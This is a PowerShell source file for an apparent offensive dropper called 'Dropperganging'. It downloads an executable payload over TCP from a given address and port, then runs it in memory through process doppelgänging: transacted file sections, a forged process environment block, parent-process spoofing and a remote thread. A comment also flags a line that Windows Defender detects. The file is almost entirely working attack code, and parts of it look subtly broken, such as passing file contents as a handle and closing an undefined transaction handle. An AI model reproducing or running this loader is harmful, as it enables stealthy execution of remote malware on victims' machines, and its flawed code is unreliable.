$script:DroppergangingVersion = "Dropperganging ver1.2"
Write-Host "Loaded $script:DroppergangingVersion"

function Dropperganging {
<#
.SYNOPSIS
.DESCRIPTION

.PARAMETER Target

#>
	[CmdletBinding()]
	param(
		[Parameter(Mandatory = $True)]
		[String]$Target,
		[Parameter(Mandatory = $False)]
		[int]$ParentPID,
		[Parameter(Mandatory = $True)]
		[String]$Address,
		[Parameter(Mandatory = $True)]
		[int]$Port
	)

	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct LARGE_INTEGER
	{
		public uint LowPart;
		public int HighPart;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct UNICODE_STRING
	{
		public UInt16 Length;
		public UInt16 MaximumLength;
		public IntPtr Buffer;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct PROCESS_BASIC_INFORMATION
	{
		public IntPtr ExitStatus;
		public IntPtr PebBaseAddress;
		public IntPtr AffinityMask;
		public IntPtr BasePriority;
		public UIntPtr UniqueProcessId;
		public IntPtr InheritedFromUniqueProcessId;
	}

	public static class Eidolon
	{
		[DllImport("KtmW32.dll")]
		public static extern IntPtr CreateTransaction(
			IntPtr lpEventAttributes,
			IntPtr UOW,
			UInt32 CreateOptions,
			UInt32 IsolationLevel,
			UInt32 IsolationFlags,
			UInt32 Timeout,
			IntPtr Description);
	
		[DllImport("Kernel32.dll")]
		public static extern IntPtr CreateFileTransacted(
			string lpFileName,
			Int32 dwDesiredAccess,
			UInt32 dwShareMode,
			IntPtr lpSecurityAttributes,
			UInt32 dwCreationDisposition,
			UInt32 dwFlagsAndAttributes,
			IntPtr hTemplateFile,
			IntPtr hTransaction,
			IntPtr pusMiniVersion,
			IntPtr pExtendedParameter);
	
		[DllImport("Kernel32.dll")]
		public static extern bool WriteFile(
			IntPtr hFile,
			Byte[] lpBuffer,
			UInt32 nNumberOfBytesToWrite,
			ref UInt32 lpNumberOfBytesWritten,
			IntPtr lpOverlapped);

		[DllImport("Kernel32.dll")]
		public static extern uint GetLastError();

		[DllImport("ntdll.dll")]
		public static extern int NtCreateSection(
			ref IntPtr section,
			UInt32 desiredAccess,
			IntPtr pAttrs,
			ref LARGE_INTEGER pMaxSize,
			uint pageProt,
			uint allocationAttribs,
			IntPtr hFile);

		[DllImport("kernel32.dll")]
		public static extern IntPtr OpenProcess(
			UInt32 processAccess,
			bool bInheritHandle,
			int processId);

		[DllImport("ntdll.dll")]
		public static extern int NtCreateProcessEx(
			ref IntPtr ProcessHandle,
			UInt32 DesiredAccess,
			IntPtr ObjectAttributes,
			IntPtr hInheritFromProcess,
			uint Flags,
			IntPtr SectionHandle,
			IntPtr DebugPort,
			IntPtr ExceptionPort,
			Byte InJob);

		[DllImport("ktmw32.dll", CharSet = CharSet.Auto)]
		public static extern bool RollbackTransaction(
			IntPtr transaction);

		[DllImport("kernel32.dll")]
		public static extern bool CloseHandle(
			IntPtr hObject);

		[DllImport("kernel32.dll")]
		public static extern Boolean VirtualProtectEx(
			IntPtr hProcess,
			IntPtr lpAddress,
			UInt32 dwSize,
			UInt32 flNewProtect,
			ref UInt32 lpflOldProtect);

		[DllImport("kernel32.dll")]
		public static extern Boolean WriteProcessMemory(
			IntPtr hProcess,
			IntPtr lpBaseAddress,
			IntPtr lpBuffer,
			UInt32 nSize,
			ref UInt32 lpNumberOfBytesWritten);

		[DllImport("kernel32.dll")]
		public static extern Boolean ReadProcessMemory( 
			IntPtr hProcess, 
			IntPtr lpBaseAddress,
			IntPtr lpBuffer,
			UInt32 dwSize, 
			ref UInt32 lpNumberOfBytesRead);

		[DllImport("ntdll.dll")]
		public static extern int NtQueryInformationProcess(
			IntPtr processHandle, 
			int processInformationClass,
			ref PROCESS_BASIC_INFORMATION processInformation,
			int processInformationLength,
			ref int returnLength);

		[DllImport("ntdll.dll")]
		public static extern int RtlCreateProcessParametersEx(
			ref IntPtr pProcessParameters,
			IntPtr ImagePathName,
			IntPtr DllPath,
			IntPtr CurrentDirectory,
			IntPtr CommandLine,
			IntPtr Environment,
			IntPtr WindowTitle,
			IntPtr DesktopInfo,
			IntPtr ShellInfo,
			IntPtr RuntimeData,
			UInt32 Flags);

		[DllImport("kernel32.dll")]
		public static extern IntPtr VirtualAllocEx(
			IntPtr hProcess,
			IntPtr lpAddress,
			UInt32 dwSize,
			Int32 flAllocationType,
			Int32 flProtect);

		[DllImport("ntdll.dll")]
		public static extern int NtCreateThreadEx(
			ref IntPtr hThread,
			UInt32 DesiredAccess,
			IntPtr ObjectAttributes,
			IntPtr ProcessHandle,
			IntPtr lpStartAddress,
			IntPtr lpParameter,
			bool CreateSuspended,
			UInt32 StackZeroBits,
			UInt32 SizeOfStackCommit,
			UInt32 SizeOfStackReserve,
			IntPtr lpBytesBuffer);
	}
"@

	# Perform some pre-run checks
	#---
	function Invoke-AllTheChecks {
		# Check PowerShell proc architecture
		Write-Host "$script:DroppergangingVersion"
		if ([IntPtr]::Size -eq 4) { # detect PowerShell bit
			$PoshIs32 = $true
		} else {
			$PoshIs32 = $false
		}
		# Check machine architecture
		if (${Env:ProgramFiles(x86)}) { # detect OS bit
			$OsIs32 = $false
		} else {
			$OsIs32 = $true
		}
		# Setup Target & Eidolon vars
		try {
			$TargetPath = (Resolve-Path $Target -ErrorAction Stop).Path # target directory path
			Write-Verbose "[+] Attempting to Connect"
			$client = New-Object System.Net.Sockets.TcpClient ($Address, $Port)
			$stream = $client.GetStream()
			$client.ReceiveBufferSize = 4096
			$buffer = New-Object System.Byte[] 1000000
			$offsetBuffer = 0
			$restBuffer=$buffer.Length
			Write-Verbose "[+] Get  a Payload"
			$ar = $stream.BeginRead($buffer, $offsetBuffer, $restBuffer, $NULL, $NULL)
			$sw = New-Object System.Diagnostics.StopWatch
			$sw.Start()
			while($TRUE){
				if($ar.IsCompleted){
					$receivedBytes = $stream.EndRead($ar)
					Write-Verbose "[+] received $receivedBytes Bytes"
					if($receivedBytes -eq 0){
						$sw.Reset()
						break
					}
					$offsetBuffer = $offsetBuffer + $receivedBytes
					$restBuffer = $restBuffer - $receivedbytes
					Write-Verbose "[+] total:$offsetBuffer Bytes"
					$ar = $stream.BeginRead($buffer, $offsetBuffer, $restBuffer, $NULL, $NULL)
					$sw.Reset()
					$sw.Start()
				}else{
					if($sw.ElapsedMilliseconds -gt 1000){ # timeout with 1sec
						break
					}
				}
			}
			Write-Verbose "[+] Create Payload"
			$PayloadBytes = New-Object System.Byte[] $offsetBuffer
			$PayloadBytes = $buffer[0..($offsetBuffer-1)] # clipping buffer & assigning payloadbytes
			for($i=0;$i -lt $buffer.Length;$i++){
				$buffer[$i]=0 # buffer clear
			}
			Write-Verbose "[+] Close client socket"
			$client.Close()

			Write-Verbose "[+] Detect Payload architecture"
			[Int32]$PEOffset = '0x{0}' -f (($PayloadBytes[63..60] | % {$_.ToString('X2')}) -join '') # detect PE header position
			$OptOffset = $PEOffset + 24 # option header offset
			[Int16]$PEArch = '0x{0}' -f ((($PayloadBytes[($OptOffset+1)..($OptOffset)]) | % {$_.ToString('X2')}) -join '')
			# PEArch == 0x010b -> 32bit, PEArch == 0x020b -> 64bit
} catch [System.IO.IOException]{
	# Time out
} catch {
			# Any fails in the "try" will
			# set everything to $false
			Write-Verbose "[!] Unexpected Error occured"
            Write-Host $_
			$TargetPath = $false
			$PayloadBytes = $false
			$PeArch = $false
		}
		# If $ParentPID check it exists
		if ($ParentPID) {
			$GetProc = Get-Process -Id $ParentPID -ErrorAction SilentlyContinue # get processHandle
			if ($GetProc) {
				$ProcIsValid = $true
			} else {
				$ProcIsValid = $false
			}
		} else {
			# PowerShell will be the parent
			$ProcIsValid = $true
		}
		
		$HashTable = @{
			PoshIs32 = $PoshIs32
			OsIs32 = $OsIs32
			TargetPath = $TargetPath
			PayloadBytes = $PayloadBytes
			PeArch = $PeArch
			ProcIsValid = $ProcIsValid
		}
		New-Object PSObject -Property $HashTable
	}

	$Runtime = Invoke-AllTheChecks

	if ($Runtime.PoshIs32 -eq $true -And $Runtime.OsIs32 -eq $false) { # 32bitPS && 64bitOS
		Write-Verbose "[!] Cannot create doppelganger from x32 PowerShell on x64 OS.."
		$false
		Return
	}
	if ($Runtime.TargetPath -eq $false) { # unexpected error occured
		Write-Verbose "[!] Failed to validate Target or Eidolon parameters.."
		$false
		Return
	}
	if ($Runtime.OsIs32 -eq $false -And $Runtime.PeArch -eq 0x010b) { # 64bitOS && 32bitPayloadEXE
		Write-Verbose "[!] Cannot create x32 doppelganger on x64 OS.."
		$false
		Return
	}
	if ($Runtime.ProcIsValid -eq $false) { # sucsseeded getting ParentProcess
		Write-Verbose "[!] Invalid doppelganger parent process selected.."
		$false
		Return
	}
	

	function Emit-UNICODE_STRING {
		param(
			[String]$Data
		)
	
		$UnicodeObject = New-Object UNICODE_STRING
		$UnicodeObject_Buffer = $Data
		[UInt16]$UnicodeObject.Length = $UnicodeObject_Buffer.Length*2
		[UInt16]$UnicodeObject.MaximumLength = $UnicodeObject.Length+1
		[IntPtr]$UnicodeObject.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($UnicodeObject_Buffer)
		[IntPtr]$InMemoryStruct = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(16) # enough for x32/x64
		[system.runtime.interopservices.marshal]::StructureToPtr($UnicodeObject, $InMemoryStruct, $true)
	
		$InMemoryStruct
	}
	
	function Set-EidolonPEB {
		param(
			[IntPtr]$hProcess,
			[Byte[]]$Bytes
		)
	
		# Eidolon PBI
		$PROCESS_BASIC_INFORMATION = New-Object PROCESS_BASIC_INFORMATION
		$PROCESS_BASIC_INFORMATION_Size = [System.Runtime.InteropServices.Marshal]::SizeOf($PROCESS_BASIC_INFORMATION)
		$RetLen = New-Object Int
		$CallResult = [Eidolon]::NtQueryInformationProcess($hProcess,0,[ref]$PROCESS_BASIC_INFORMATION,$PROCESS_BASIC_INFORMATION_Size, [ref]$RetLen)
		if ($CallResult -ne 0) {
			Write-Verbose "[!] Failed to acquire PBI"
			$false
			Return
		} else {
			Write-Verbose "[+] Acquired Eidolon PBI"
		}
		
		# Get payload entrypoint & arch
		Write-Verbose "[+] calc Payload arch and EntryPoint"
		[Int32]$PEOffset = '0x{0}' -f (($Bytes[63..60] | % {$_.ToString('X2')}) -join '')
		$OptOffset = $PEOffset + 24
		[Int16]$PEArch = '0x{0}' -f ((($Bytes[($OptOffset+1)..($OptOffset)]) | % {$_.ToString('X2')}) -join '')
		[Int32]$EntryPoint = '0x{0}' -f ((($Bytes[($OptOffset+19)..($OptOffset+16)]) | % {$_.ToString('X2')}) -join '')
		# PEArch+0x10=EntryPoint
		# Get remote ImageBaseAddress
		if ($PEArch -eq 0x010b) {
			# Payload is x32
			Write-Verbose "[+] Eidolon architecture is 32-bit"
			[IntPtr]$rImgBaseOffset = $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64() + 0x8
			$ReadSize = 4
		} else {
			# Payload is x64
			Write-Verbose "[+] Eidolon architecture is 64-bit"
			[IntPtr]$rImgBaseOffset = $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64() + 0x10
			$ReadSize = 8
		}
		$BytesRead = 0
		[IntPtr]$lpBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ReadSize)
		$CallResult = [Eidolon]::ReadProcessMemory($hProcess,$rImgBaseOffset,$lpBuffer,$ReadSize,[ref]$BytesRead)
		if ($CallResult -eq 0) {
			$false
			Write-Verbose "[!] Failed to read Eidolon image base"
			Return
		}

		if ($PEArch -eq 0x010b) {
			# Payload is x32
			$PEImageBaseAddress = [System.Runtime.InteropServices.Marshal]::ReadInt32($($lpBuffer.ToInt64()))
		} else {
			# Payload is x64
			$PEImageBaseAddress = [System.Runtime.InteropServices.Marshal]::ReadInt64($($lpBuffer.ToInt64()))
		}
		$ProcessEntryPoint = $PEImageBaseAddress+$EntryPoint
		Write-Verbose "[+] Eidolon image base: 0x$('{0:X}' -f $PEImageBaseAddress)"
		Write-Verbose "[+] Eidolon entry point: 0x$('{0:X}' -f $ProcessEntryPoint)"
		
		# Create UNICODE_STRING process parameters
		$uTargetPath = Emit-UNICODE_STRING -Data $Runtime.TargetPath
		$uDllDir = Emit-UNICODE_STRING -Data "C:\Windows\System32"
		$uCurrentDir = Emit-UNICODE_STRING -Data $(Split-Path $Runtime.TargetPath -Parent)
		$uWindowName = Emit-UNICODE_STRING -Data "Eidolon"

		$pProcessParameters = [IntPtr]::Zero
		$CallResult = [Eidolon]::RtlCreateProcessParametersEx([ref]$pProcessParameters,$uTargetPath,$uDllDir,$uCurrentDir,$uTargetPath,[IntPtr]::Zero,$uWindowName,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero,1)
		if ($CallResult -ne 0) {
			$false
			Write-Verbose "[!] Failed to create process parameters"
			Return
		} else {
			Write-Verbose "[+] Created Eidolon process parameters"
		}
		
		# Copy parameters to Eidolon
		$ProcParamsLength = [System.Runtime.InteropServices.Marshal]::ReadInt32($($pProcessParameters.ToInt64())+4)
		[IntPtr]$EidolonProcParams = [Eidolon]::VirtualAllocEx($hProcess,$pProcessParameters,$ProcParamsLength,0x3000,4)
		if ($EidolonProcParams -eq [IntPtr]::Zero) {
			$false
			Write-Verbose "[!] Failed to allocate memory in Eidolon"
			Return
		} else {
			Write-Verbose "[+] Allocated memory in Eidolon"
		}
		$BytesWritten = 0
		$CallResult = [Eidolon]::WriteProcessMemory($hProcess,$pProcessParameters,$pProcessParameters,$ProcParamsLength,[ref]$BytesWritten)
		if (!$CallResult) {
			$false
			$res=[Eidolon]::GetLastError()
			Write-Verbose "[!] Failed to write process parameters to Eidolon $res"
			Return
		} else {
			Write-Verbose "[+] Process parameters duplicated into Eidolon"
		}
	
		# Set remote ProcessParameters
		if ($PEArch -eq 0x010b) {
			# Payload is x32
			[IntPtr]$rProcParamOffset = $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64() + 0x10
			$WriteSize = 4
			[IntPtr]$lpBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($WriteSize)
			[System.Runtime.InteropServices.Marshal]::WriteInt32($lpBuffer.ToInt32(),$pProcessParameters.ToInt32())
		} else {
			# Payload is x64
			[IntPtr]$rProcParamOffset = $PROCESS_BASIC_INFORMATION.PebBaseAddress.ToInt64() + 0x20
			$WriteSize = 8
			[IntPtr]$lpBuffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($WriteSize)
			[System.Runtime.InteropServices.Marshal]::WriteInt64($lpBuffer.ToInt64(),$pProcessParameters.ToInt64())
		}
		$BytesWritten = 0
		$CallResult = [Eidolon]::WriteProcessMemory($hProcess,$rProcParamOffset,$lpBuffer,$WriteSize,[ref]$BytesWritten)
		if (!$CallResult) {
			$false
			Write-Verbose "[!] Failed to rewrite Eidolon->PEB->pProcessParameters"
			Return
		} else {
			Write-Verbose "[+] Rewrote Eidolon->PEB->pProcessParameters"
		}
		
		# Return Eidolon entrypoint
		$ProcessEntryPoint
	}
	
	# Create transaction
	Start-Transaction

	# open file
	$hTransactedFile=Get-Content $Runtime.TargetPath -usetransaction

	# write file



	# Create section from transacted file
	$LargeInteger = New-Object LARGE_INTEGER
	$hSection = [IntPtr]::Zero
	$CallResult = [Eidolon]::NtCreateSection([ref]$hSection,0xF001F,[IntPtr]::Zero,[ref]$LargeInteger,2,0x1000000,$hTransactedFile)
	if ($CallResult -ne 0) {
		$res=[Eidolon]::GetLastError()
		Write-Verbose "[!] NtCreateSection failed..$res"
		$false
		Return
	} else {
		Write-Verbose "[+] Created section from transacted file"
	}
	
	# Rollback transaction & clean
	Undo-Transaction

	$CallResult = [Eidolon]::CloseHandle($hTransaction)
	$CallResult = [Eidolon]::CloseHandle($hTransactedFile) # detect by windows defender
	Write-Verbose "[+] Rolled back transaction changes"

	# Get handle to the parent PID
	if ($ParentPID) {
		$hParentPID = [Eidolon]::OpenProcess(0x1F0FFF,$false,$ParentPID)
		if ($hParentPID -eq [IntPtr]::Zero) {
			Write-Verbose "[!] Unable to open handle to the specified parent => $($(Get-Process -PID $ParentPID).ProcessName)"
			$false
			Return
		} else {
			Write-Verbose "[+] Opened handle to the parent => $($(Get-Process -PID $ParentPID).ProcessName)"
		}
	} else {
		# This is a pseudo handle to self
		$hParentPID = [IntPtr]-1
	}

	# Create process from section
	$hProcess = [IntPtr]::Zero
	$CallResult = [Eidolon]::NtCreateProcessEx([ref]$hProcess,0x1FFFFF,[IntPtr]::Zero,$hParentPID,4,$hSection,[IntPtr]::Zero,[IntPtr]::Zero,0)
	if ($hProcess -eq [IntPtr]::Zero) {
		$res=[Eidolon]::GetLastError()
		Write-Verbose "[!] NtCreateProcessEx failed..$res"
		$false
		Return
	} else {
		Write-Verbose "[+] Created process from section"
	}
	
	# Rewrite Eidolon PEB
	$lpStartAddress = Set-EidolonPEB -hProcess $hProcess -Bytes $Runtime.PayloadBytes
	if (!$lpStartAddress) {
		Write-Verbose "[!] Failed to set up remote PEB.."
		$false
		Return
	}
	
	# Animate Eidolon ;)
	$hRemoteThread = [IntPtr]::Zero
	$CallResult = [Eidolon]::NtCreateThreadEx([ref]$hRemoteThread,0x1FFFFF,[IntPtr]::Zero,$hProcess,[IntPtr]$lpStartAddress,[IntPtr]::Zero,$false,0,0,0,[IntPtr]::Zero)
	if ($CallResult -ne 0) {
		$res=[Eidolon]::GetLastError()
		Write-Verbose "[!] NtCreateThreadEx failed..$res"
		$false
		Return
	} else {
		Write-Verbose "[+] Created Eidolon main thread.."
		$true
	}
}
